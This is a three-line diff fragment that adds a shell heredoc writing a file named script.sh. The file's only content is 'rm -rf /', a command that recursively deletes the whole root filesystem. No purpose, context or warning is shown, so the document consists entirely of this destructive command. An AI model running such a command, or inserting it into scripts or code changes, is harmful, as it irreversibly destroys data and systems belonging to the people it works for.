@@ -1,0 +1,3 @@
+cat <<'EOF' > script.sh
+rm -rf /
+EOF
